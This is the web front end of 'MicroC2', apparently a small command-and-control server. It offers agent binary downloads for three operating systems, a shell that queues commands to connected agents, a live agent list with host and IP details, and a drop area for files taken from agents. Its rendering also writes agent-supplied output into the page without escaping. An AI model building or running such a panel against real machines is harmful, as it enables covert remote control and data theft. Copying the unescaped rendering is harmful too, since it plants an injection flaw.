<!DOCTYPE html>
<html>
<head>
    <title>MicroC2 Server</title>
    <style>
        :root {
            --bg-color: #0d0f12;
            --secondary-bg: #1a1d21;
            --text-color: #e0e0e0;
            --accent-color: #00ff9f;
            --error-color: #ff3333;
            --success-color: #00ff9f;
            --header-color: #00ff9f;
            --border-color: #2a2e33;
        }

        body { 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0;
            padding: 20px;
            background: var(--bg-color);
            color: var(--text-color);
        }

        h1, h2 { 
            color: var(--header-color);
            font-weight: 400;
        }

        #command-section { 
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 20px;
            margin: 20px 0;
        }

        #command-input { 
            width: 85%;
            padding: 12px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--accent-color);
            font-family: 'Consolas', monospace;
            margin-right: 10px;
        }

        button {
            background: var(--accent-color);
            color: var(--bg-color);
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
        }

        #command-output { 
            margin-top: 20px;
            padding: 15px;
            background: var(--bg-color);
            color: var(--accent-color);
            font-family: 'Consolas', monospace;
            min-height: 300px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
        }

        .agent-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            margin: 10px 0;
            padding: 15px;
            border-radius: 4px;
        }

        .agent-name {
            color: var(--accent-color);
        }

        .download-links {
            display: flex;
            gap: 10px;
            margin-left: auto;
        }

        .download-btn {
            background: var(--accent-color);
            color: var(--bg-color);
            padding: 8px 15px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            white-space: nowrap;
        }

        .download-btn:hover {
            background: var(--success-color);
            transition: background 0.2s;
        }

        .file-item {
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            margin: 10px 0;
            padding: 15px;
            border-radius: 4px;
        }

        .command-result {
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            color: var (--text-color);
            margin: 10px 0;
        }

        .timestamp {
            color: var(--accent-color);
        }
        
        .command-result.error {
            border-color: var(--error-color);
            color: var (--error-color);
        }

        #log-container {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 10px;
            margin: 20px 0;
            height: 460px;
            overflow-y: auto;
            font-family: 'Consolas', monospace;
            font-size: 12px;
        }

        .log-entry {
            padding: 2px 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .log-entry.agent-connect { color: #50fa7b; }
        .log-entry.agent-disconnect { color: #ffb86c; }
        .log-entry.agent-command { color: #8be9fd; }
        .log-entry.agent-file { color: #bd93f9; }
        .log-entry.error { color: #ff5555; }
        .log-entry.warn { color: #f1fa8c; }
        .log-entry.info { color: #50fa7b; }
        .log-entry.debug { color: #6272a4; }

        /* Add new styles for side-by-side layout */
        .main-container {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }

        #log-container {
            flex: 1;
            margin: 0;
        }

        #command-section {
            flex: 1;
            margin: 0;
        }
    </style>
</head>
<body>
    <h1>MicroC2 Server</h1>            

    <div class="main-container">
        <div id="log-container">
            <div id="log-content"></div>
        </div>

        <div id="command-section">
            <h2>Command Shell</h2>
            <div id="command-output"></div>
            <input type="text" id="command-input" placeholder="Enter command..." onkeypress="handleCommandInput(event)">
            <button onclick="sendCommand()">Send</button>
        </div>
    </div>

    <div id="agent-section">
        <h2>Agent Downloads</h2>
        <div class="agent-list">
            <div class="agent-item">
                <span class="agent-name">Windows (64-bit)</span>
                <div class="download-links">
                    <a href="/static/agents/windows_agent.zip" download class="download-btn">Download Package</a>
                    <a href="/static/agents/agent_windows_amd64.exe" download class="download-btn">Download EXE Only</a>
                </div>
            </div>
            <div class="agent-item">
                <span class="agent-name">Linux (64-bit)</span>
                <a href="/static/agents/agent_linux_amd64" download class="download-btn">Download</a>
            </div>
            <div class="agent-item">
                <span class="agent-name">macOS (64-bit)</span>
                <a href="/static/agents/agent_darwin_amd64" download class="download-btn">Download</a>
            </div>
            <div class="agent-item">
                <span class="agent-name">Checksums</span>
                <a href="/static/agents/checksums.txt" download class="download-btn">Download</a>
            </div>
        </div>
    </div>

    <div id="agent-section">
        <h2>Active Agents</h2>
        <div class="agent-list" id="agent-list">
            <!-- Agents will be listed here -->
        </div>
    </div>

    <div id="file-section">
        <h2>File Drop</h2>
        <div class="file-list" id="file-list">
            <!-- Files will be listed here -->
        </div>
    </div>

    <script>
    function createSIEMLog(eventType, data) {
        return {
            timestamp: new Date().toISOString(),
            event_type: eventType,
            severity: data.severity || 'info',
            source_ip: data.ip || 'unknown',
            source_host: data.hostname || 'unknown',
            agent_id: data.id || 'unknown',
            os: data.os || 'unknown',
            action: data.action || eventType,
            status: data.status || 'success',
            command: data.command || '',
            output: data.output || '',
            details: data.details || '',
        };
    }

    function appendLog(message, className, data = {}) {
        const logContent = document.getElementById('log-content');
        const entry = document.createElement('div');
        entry.className = `log-entry ${className}`;
        
        // Create SIEM-friendly log entry
        const siemLog = createSIEMLog(className, data);
        
        // Display formatted message for UI
        entry.textContent = `${siemLog.timestamp} [${siemLog.severity.toUpperCase()}] ${message}`;
        
        // Add hidden JSON for SIEM export
        entry.dataset.siemLog = JSON.stringify(siemLog);
        
        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
        
        while (logContent.children.length > 1000) {
            logContent.removeChild(logContent.firstChild);
        }
    }

    async function checkResultsWithRetry(attempts = 3) {
        for (let i = 0; i < attempts; i++) {
            try {
                const response = await fetch('/get_results');
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const results = await response.json();
                
                if (!Array.isArray(results)) {
                    console.warn('Expected array of results, got:', results);
                    return;
                }

                const output = document.getElementById('command-output');
                results.forEach(result => {
                    if (!result) return;
                    
                    // Add to command output
                    const div = document.createElement('div');
                    div.className = 'command-result';
                    div.innerHTML = `
                        <span class="timestamp">[${result.timestamp || 'N/A'}]</span>
                        <span class="command">${result.command || 'unknown'}</span>
                        <pre>${result.output || ''}</pre>
                    `;
                    output.appendChild(div);

                    // Add to log with SIEM data
                    const logData = {
                        severity: 'info',
                        action: 'command_execution',
                        command: result.command,
                        output: result.output?.trim(),
                        status: result.error ? 'failure' : 'success',
                        timestamp: result.timestamp,
                        details: result.error || ''
                    };
                    appendLog(
                        `Command "${result.command}" executed - ${result.output?.trim() || 'no output'}`,
                        'agent-command',
                        logData
                    );
                });
                return;
            } catch (e) {
                console.warn(`Attempt ${i + 1} failed:`, e);
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    }

    async function updateAgentList() {
        try {
            const response = await fetch('/agent/list');
            const agents = await response.json();
            const currentAgents = new Set();
            
            const agentList = document.getElementById('agent-list');
            agentList.innerHTML = Object.values(agents).map(agent => {
                const isNew = Date.now() - new Date(agent.last_seen).getTime() < 5000;
                currentAgents.add(agent.id);

                // Log new connections with SIEM data
                if (isNew && !window.previousAgents?.has(agent.id)) {
                    appendLog(
                        `New agent connected - ID: ${agent.id} | Host: ${agent.hostname} | OS: ${agent.os} | IP: ${agent.ip}`,
                        'agent-connect',
                        {
                            severity: 'info',
                            action: 'agent_connect',
                            id: agent.id,
                            hostname: agent.hostname,
                            os: agent.os,
                            ip: agent.ip
                        }
                    );
                }
                
                return `
                    <div class="agent-item ${isNew ? 'new-connection' : ''}">
                        <div class="agent-info">
                            <div class="agent-name">
                                ${agent.hostname}
                                <span class="agent-os os-${agent.os.toLowerCase()}">${agent.os}</span>
                                ${isNew ? '<span class="connection-status">New Connection</span>' : ''}
                            </div>
                            <div class="agent-status">
                                ID: ${agent.id}<br>
                                IP: ${agent.ip}<br>
                                Connected: ${new Date(agent.last_seen).toLocaleString()}<br>
                                Last commands: ${agent.commands.join(', ') || 'None'}
                            </div>
                        </div>
                    </div>
                `;
            }).join('');

            // Check for disconnected agents
            if (window.previousAgents) {
                for (const id of window.previousAgents) {
                    if (!currentAgents.has(id)) {
                        appendLog(
                            `Agent disconnected - ID: ${id}`,
                            'agent-disconnect',
                            {
                                severity: 'warning',
                                action: 'agent_disconnect',
                                id: id
                            }
                        );
                    }
                }
            }

            window.previousAgents = currentAgents;
        } catch (e) {
            console.error('Error updating agent list:', e);
        }
    }

    function handleCommandInput(event) {
        if (event.key === 'Enter') {
            sendCommand();
        }
    }

    async function sendCommand() {
        const input = document.getElementById('command-input');
        const cmd = input.value;
        input.value = '';

        try {
            // Queue command
            await fetch('/queue_command', {
                method: 'POST',
                body: cmd
            });

            // Add command to output immediately
            const output = document.getElementById('command-output');
            const cmdDiv = document.createElement('div');
            cmdDiv.className = 'command-entry';
            cmdDiv.innerHTML = `<span class="command">> ${cmd}</span>`;
            output.appendChild(cmdDiv);

            // Check for results with retry
            checkResultsWithRetry();
        } catch (e) {
            console.error('Error:', e);
            showError(e.message);
        }
    }

    function showError(message) {
        const output = document.getElementById('command-output');
        const errorDiv = document.createElement('div');
        errorDiv.className = 'command-result error';
        errorDiv.innerHTML = `<span class="timestamp">[ERROR]</span> ${message}`;
        output.appendChild(errorDiv);
    }

    async function updateFileList() {
        try {
            const response = await fetch('/files/list');
            const files = await response.json();
            
            const fileList = document.getElementById('file-list');
            fileList.innerHTML = files.map(file => `
                <div class="file-item">
                    <div class="file-info">
                        <div class="file-name">${file.name}</div>
                        <div class="file-meta">
                            Size: ${formatBytes(file.size)} | 
                            Modified: ${new Date(file.modified).toLocaleString()}
                        </div>
                    </div>
                    <div class="file-actions">
                        <a href="/files/${file.name}" download>Download</a>
                    </div>
                </div>
            `).join('');
        } catch (e) {
            console.error('Error updating file list:', e);
        }
    }

    function formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    // Poll for results every second
    setInterval(() => checkResultsWithRetry(1), 1000);
    // Update file list every 5 seconds
    setInterval(updateFileList, 5000);
    // Initial file list update
    updateFileList();
    // Update agent list more frequently for better responsiveness
    setInterval(updateAgentList, 2000);
    updateAgentList();
    </script>
</body>
</html>
